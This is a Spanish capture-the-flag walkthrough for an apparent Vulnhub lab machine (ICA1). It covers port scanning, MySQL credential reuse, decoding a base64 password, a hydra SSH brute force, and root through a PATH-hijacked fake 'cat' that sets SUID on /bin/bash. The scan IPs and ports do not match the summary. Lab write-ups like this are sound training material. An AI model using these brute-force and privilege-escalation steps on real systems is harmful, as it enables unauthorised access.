# Summary
- IP: 192.168.0.112
- Ports: 22,80,3306,33060
- OS: Linux (Debian )
- Services & Applications:
	-  22 -> OpenSSH 8.4p1 Debian 5
	-  80 -> Apache httpd 2.4.48
	-  3306-> MySQL 8.0.26
	-  33060 -> mysqlx?

# Recon

- Configuración de interfaz de red para que Vmware detecte la máquina en la misma red bridge:
 tecla E
 rw init=/bin/bash
 etc/network
 interfaces ---> corregir nombre de interfaz
 reiniciar

- Escaneo básico de puertos:

```
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.129.26 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```
$sudo nmap -p21,80,2222 -sCV 10.10.129.26 -oN targeted
```

- Escaneo básico de página web:

```
$nmap --script http-enum -p80 192.168.0.112 -oN webScan
```

- Buscamos exploits para qdpm 9.2:

```
$searchsploit qdpm 9.2
```
- Encontramos credenciales para entrar a una base de datos:

```
$mysql -h 192.168.0.112 -u qdpmadmin -p
```

-  Analizamos las tablas:

```
show databases;
use staff;
show tables;
select * from user;
select * from login;
```

- Obtenemos usuarios potenciales y contraseñas al parecer encriptadas en base 64, guardamos los usuarios y probamos cada contraseña desencriptada para realizar ataque por fuerza bruta a SSH con hydra:

- Para desencriptar base 64;

```
$echo "REpjZVZ5OThXMjhZN3dMZw=" | base64 -d; echo
```

- Podemos hacer un diccionario con cada usuario y contraseña para realizar el ataque de fuerza bruta:

```
$hydra -L /home/dante/Vulnhub/ICA1/content/usuarios.txt -p DJceVy98W28Y7wLg ssh://192.168.0.112
```

- Encontramos credenciales SSH para dos usuarios: dexter y travis, como el usuario dexter no encontramos nada interesante; con el usuario travis encontramos la flag de usuario:

#  USER FLAG: ICA{Secret_Project}

# ESCALANDO PRIVILEGIOS:

- Hacemos sudo -l pero no encontramos nada, buscamos binarios con permisos SUID y encontramos uno curioso "/opt/get_access":

```
find / -perm -4000 2>/dev/null
```

- lo analizamos:

```
file /opt/get_access
strings /opt/get_access
```

- Nos damos cuenta que en una parte del binario ejecuta el comando cat, el cual usaremos para que ejecute un cat modificado por nosotros que crearemos en el duirectorio temp, el cual otorgará permisos SUID a la bash:
 ```
 touch cat
 chmod +x cat
 nano cat
 chmod u+s /bin/bash
 ```

- Modificamos el PATH para que ejecute nuestro cat y no el nativo del sistema:

```
echo $PATH
export PATH=/tmp:$PATH
```

- Ejecutamos el binario y la bash ahora tendrá permisos de SUID, lo que podemos comprobar y ejecutar:

```
ls -l /bin/bash
bash -p
```

# ROOT FLAG: ICA{Next_Generation_Self_Renewable_Genetics}
